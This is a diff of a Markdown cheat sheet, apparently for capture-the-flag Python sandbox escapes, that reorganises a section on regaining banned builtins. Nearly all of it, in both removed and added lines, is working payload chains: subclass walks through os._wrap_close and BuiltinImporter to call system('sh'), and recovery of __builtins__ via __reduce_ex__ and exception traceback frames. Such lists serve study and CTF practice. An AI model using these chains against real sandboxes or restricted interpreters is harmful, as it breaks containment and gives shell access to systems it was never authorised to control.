@@ -37,33 +37,32 @@ Use Unicode characters that look like ASCII but bypass filters. See [details](./
 
 ### Accessing Builtins When Banned
 
-- Get subclasses of object:
+Use [automated script](./find_chains.py) to find chains:
+
+- Get subclasses of object, then get builtins via e.g. `().__class__.__base__.__subclasses__()[os_wrap_close_index].__init__.__globals__["__builtins__"]`:
     - `().__class__.__base__.__subclasses__()`
     - `().__class__.__mro__[1].__subclasses__()` or `().__class__.__mro__.__getitem__(1).__subclasses__()`
     - `().__setattr__.__objclass__.__subclasses__()`
-    - Get shell:
-        - `().__class__.__base__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")`, find os_wrap_close_index via `str(().__class__.__base__.__subclasses__()).split(", ").index("<class 'os._wrap_close'>")`
-        - `().__class__.__base__.__subclasses__()[builtinimporter_index].load_module("os").system("sh")`, find builtinimporter_index via `str(().__class__.__base__.__subclasses__()).split(", ").index("<class '_frozen_importlib.BuiltinImporter'>")`
-- Find via `class.*.__globals__`, using [automated script](./find_builtins.py):
+    - 
+- Find via `class.*.__globals__`:
     - `().__class__.__subclasses__()[codecs_codecinfo_index].__new__.__globals__["__builtins__"]`
     - With `import re`:
         - `''.__class__.__subclasses__()[strenum_index].__dir__.__globals__["__builtins__"]`
         - `{}.__class__.__subclasses__()[collections_counter_index].__pos__.__globals__["__builtins__"]`
-
-When `__import__` is available:
-
-- `().__reduce_ex__(2)[0].__builtins__`
-- `().__reduce_ex__(2)[0].__globals__["__builtins__"]`
-
-When you have access to exception:
-
-```python
-try:
-    1/0
-except Exception as e:
-    print(e.__traceback__.tb_frame.f_builtins)
-    print(e.__traceback__.tb_frame.f_globals["__builtins__"])
-```
+- Get shell without getting builtins:
+    - `().__class__.__base__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")`, find os_wrap_close_index via `str(().__class__.__base__.__subclasses__()).split(", ").index("<class 'os._wrap_close'>")`
+    - `().__class__.__base__.__subclasses__()[builtinimporter_index].load_module("os").system("sh")`, find builtinimporter_index via `str(().__class__.__base__.__subclasses__()).split(", ").index("<class '_frozen_importlib.BuiltinImporter'>")`
+- When `__import__` is available:
+    - `().__reduce_ex__(2)[0].__builtins__`
+    - `().__reduce_ex__(2)[0].__globals__["__builtins__"]`
+- When you have access to exception:
+    ```python
+    try:
+        1/0
+    except Exception as e:
+        print(e.__traceback__.tb_frame.f_builtins)
+        print(e.__traceback__.tb_frame.f_globals["__builtins__"])
+    ```
 
 ### Numbers and Booleans Without Digits
 
